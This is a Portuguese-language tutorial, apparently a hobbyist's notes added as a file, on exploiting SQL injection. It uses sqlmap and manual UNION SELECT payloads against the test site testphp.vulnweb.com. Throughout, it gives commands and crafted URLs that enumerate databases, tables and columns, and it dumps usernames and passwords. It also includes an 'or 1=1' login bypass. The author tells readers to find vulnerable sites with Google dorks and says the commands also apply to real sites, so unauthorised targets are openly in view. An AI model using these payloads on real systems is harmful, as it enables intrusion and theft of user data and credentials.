@@ -1,0 +1,218 @@
+EXPLORANDO FALHA SQL USANDO APLICACAO SQLMAP NO KALI LINUX (RESULTADOS DESCRITOS FOI TESTADO NO PARROT)
+
+www.google.com
+
+pesquisar inurl:.php?cat=
+
+entrar em um site vulneravel...
+
+comando de listagem de conteudo de tabela
+
+select * from login where usuario='admin' or 1=1 limit 3;#' and senha='123';
+
+aqui os comandos de instrusao e alguns sites de testes e sites reais:
+
+apos a busca apareceram alguns sites e sugestoes.. voce vai
+no primeiro que eh o pictures... acunix algo do tipo
+
+o endereco web exibira a seguinte url.. e se nao exibir apague ateh ficar assim
+
+http://testphp.vulnweb.com/listproducts.php?cat=1
+
+antes do numero um inserimos uma aspa ' entre o sinal de igual e o numero 1
+o que do navegador pode ser convertido pra
+hexadecimal como %271, mas preocupe-se apenas em inserir as aspar.
+
+em seguida copie o endereco ja com a aspar e cole-o no slqmap com as seguintes instrucoes:
+
+
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=%271 --dbs
+
+1- Primeiramente ele identifica o tipo de DBMS se eh MySQL ele avisa.. e tals.. entao ele vai
+fazer analises de entrada se a brecha existe mesmo e se confirmada
+ele te perguntara de primeira se voce quer executar algum exploit.
+eu digitei N pq ainda nao conheco bem o mysql e seus exploit..
+
+2- em seguida ele pergunta se voce quer os metodos do banco.. parametros de arquitetura...
+e se existe falhas.. eu digitei Y porque eh o que eu queria
+
+3- ele escaneiou e achou uma falha no parametro cat via metodo GET...
+entao me perguntou por ultimo se eu queria continuar testando outros
+metodos pra talvez achar uma vuln mais acessivel e tals.. pra mim 
+a falha get foi suficiente. portanto dei N
+
+Entao automaticamente ele executara um payload que resondera com
+informacoes do Database... como o nome do banco que costuma ser o
+de cima... e embaixo um banco default do mysql. nesse caso foram:
+
+[*] acuart
+[*] information_schema
+
+claro que agora vamos querer ver as tabelas desse .DB entao:
+
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=%271 -D acuart --tables
+
+Database: acuart
+[8 tables]
++-----------+
+| artists   |
+| carts     |
+| categ     |
+| featured  |
+| guestbook |
+| pictures  |
+| products  |
+| users     |
++-----------+
+
+Se quiser ver o conteudo de uma das colunas:
+
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=%271 -D acuart -T users --columns
+
+Database: acuart
+Table: users
+[8 columns]
++---------+--------------+
+| Column  | Type         |
++---------+--------------+
+| address | mediumtext   |
+| cart    | varchar(100) |
+| cc      | varchar(100) |
+| email   | varchar(100) |
+| name    | varchar(100) |
+| pass    | varchar(100) |
+| phone   | varchar(100) |
+| uname   | varchar(100) |
++---------+--------------+
+
+para detalhes que queremos hehe:
+
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=%271 -D acuart -T users -C name,uname,pass,phone --dump
+
+a saida para quando solicitei apenas uname,pass foi
+
++-------+------+
+| uname | pass |
++-------+------+
+| test  | test |
+| test  | test |
++-------+------+
+
+podemos entao logar com o usuario test e a senha teste.
+
+--------------------------------------------------------------------------------------------------------------------
+
+Agora vamos aprender a explorar a falha via web
+
+como no primeiro metodo fazemos a pesquisa inurl:.php?cat=
+
+ao achar um site...achado vamos editando o numero que vem apos o
+sinal de igual= pra ver as paginas e configuracoes do site feito isso
+vamos verificar se ele eh vulneravel a
+slqinjection, definimos isso se apos inserir uma aspar ex: ...php?cat='1 ou 1' ...inserir uma
+apsar ou algum outro
+demarcador que seja usado por uma funcao de sql. E o site retornar
+um erro de sql logo este eh vulneravel.
+
+entao mantemos o link do site como o original (sem aspar)
+e fazemos o seguinte:
+
+para contar quantas colunas temos... podemos usar comando:
+exemplo:
+
+cat.php?id=1 order by 1 (da enter)
+cat.php?id=1 order by 2 (da enter)
+cat.php?id=1 order by 3 (da enter)
+cat.php?id=1 order by 4 (da enter)
+cat.php?id=1 order by 5 (da enter) #aqui nao aparece conteudo,
+na quinta vez nao exibiu nada na pagina...
+entao podemos afirmar que este site tem 4 colunas.
+
+outra forma de fazer isso eh usar o comando:
+exemplo:
+
+cat.php?id=1 union select 1 (ele resposde que o numero de colunas eh diferente de 1)
+cat.php?id=1 union select 1,2 (diferente tambem de 2)
+cat.php?id=1 union select 1,2,3 (diferente tambem de 3)
+cat.php?id=1 union select 1,2,3,4 (igual a 4, entao ele exibira uma pagina)
+cat.php?id=1 union select 1,2,3,4,5 (tornara a dizer que eh diferente)
+
+podemos ainda acrescentar o comando -(menos) para podermos visualizar
+melhor apenas o que estamos fazendo ao tentar descobrir as colunas... ele
+oculta a imagem exibida referente ao id da pagina..
+ex:
+
+cat.php?id=-1 union select 1,2,3,4
+
+dai ja podemos ir testando qual coluna que nos da a resposta que
+queremos para podermos inserir comandos..
+
+cat.php?id=1 union select 1,2,3,4 (normal)
+cat.php?id=1 union select 'oi',2,3,4 (Nao apareceu oi na pagina)
+cat.php?id=1 union select 1,'oi',3,4 (Oi apareceu na tela)
+cat.php?id=1 union select 1,2,'oi',4 (nao vai exibir nada)
+cat.php?id=1 union select 1,2,3,'oi' (nao vai exibir nada)
+
+para nao ter que ir buscando de 1 a 1 vc pode usar o recurso all
+
+cat.php?id=-1 union all select 1,2,3,4 --+ 
+
+entao podemos manipular dados pela brecha do campo 2, tal que
+certamente aceitara comando do banco de dados especifico.
+
+tesmos com acuart
+
+http://testphp.vulnweb.com/listproducts.php?cat=1%20order%20by%2012 (&20= espaco hexadecimal e %271='1)
+http://testphp.vulnweb.com/listproducts.php?cat=1 order by 12 (checamos com order by, o erro ocorreu no 12)
+
+entao seguimos para testar com union select qual campo poderia ser editado:
+
+
+http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1
+http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2 (error)
+http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3 (error)
+http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4 (error)
+http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5 (error)
+http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6 (error)
+http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,7 (error)
+http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,7,8 (error)
+http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,7,8,9 (error)
+http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,7,8,9,10 (error)
+http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,7,8,9,10,11 (soh aqui apareceu uma pagina, eh esse)
+http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,7,8,9,10,11,12 (error)
+
+ou
+
+http://testphp.vulnweb.com/listproducts.php?cat=1 union all select 1,2,3,4,5,6,7,8,9,10,11 --+
+
+Entao o bloco 11 sera nossa porta de entrada:
+
+http://testphp.vulnweb.com/listproducts.php?cat=-1%20union%20select%201,2,3,4,5,6,7,8,9,10,%27oi%27 (parametro %27=' hexadecimal)
+http://testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,2,3,4,5,6,7,8,9,10,'oi'
+
+usamos o parametro -1 no id e editamos o campo 11 com ex: '10,'oi' ja vemos que apos dar enter ele insere um texto oi na pagina
+
+agora podemos entrar com comandos, exemplo se voce quiser saber a versao do .db...
+
+http://testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,2,3,4,5,6,7,8,9,10,version();
+
+se ele aceitou esse comando aceitara os demais...
+
+version();
+database();
+current_user();
+
+agora podemos obter informacoes de colunas etc... para isso usamos o schema:
+
+ver bancos de dados
+http://testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,2,3,4,5,6,7,8,9,10,schema_name from information_schema.schemata 
+
+ver colunas de todos bancos de dados
+
+http://testphp.vulnweb.com/listproducts.php?cat=-1 union select 1,2,3,4,5,6,7,8,9,10,table_name from information_schema.tables
+
+ver de um especifico
+
+http://testphp.vulnweb.com/listproducts.php?cat=-1 union select 
+1,2,3,4,5,6,7,8,9,10,table_name from information_schema.tables where table_schema="information_schema" (parametro hexadecimal %22=" )
+
